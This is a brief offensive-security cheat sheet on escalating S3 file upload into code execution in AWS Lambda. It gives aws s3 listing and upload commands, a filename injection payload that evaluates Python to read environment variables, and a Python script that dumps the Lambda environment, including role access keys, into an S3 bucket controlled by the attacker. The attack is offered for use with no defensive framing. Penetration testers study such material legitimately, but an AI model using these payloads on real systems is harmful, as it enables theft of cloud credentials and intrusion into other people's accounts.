# File upload to RCE

## Verify file upload

List Buckets

```
aws s3 ls
```

Upload file

```
aws s3 cp <local file> s3://<bucket>    #upload in bucket root
aws s3 cp <local file> s3://<bucket>/<path>
```

List files in bucket

```
aws s3 ls <bucket>
aws s3 ls <bucket>/<path>
```

Download file

```
aws s3 cp s3://<bucket>/<path>/<filename> .
```

## Exploit

We attempt to retrieve the Lambda environment and reveal the role Access Key. The output might be reflected in the uploaded file, another file in the same bucket or a log file.

### Malicious filenames

```
import os;dict(os.environ)
```

### Malicious script

This script executes a command and stores the output in a S3 bucket controlled by the attacker

```python
#!/usr/bin/env python3
import boto3
import time
import os

BUCKET_NAME = ""
FILE_PATH = "output.txt"

#Dump the environment variables. Feel free to change the payload if needed
output = dict(os.environ)  

#write to bucket  
s3 = boto3.client('s3')
s3.put_object(Bucket=BUCKET_NAME, Key=FILE_PATH, Body=output)
```
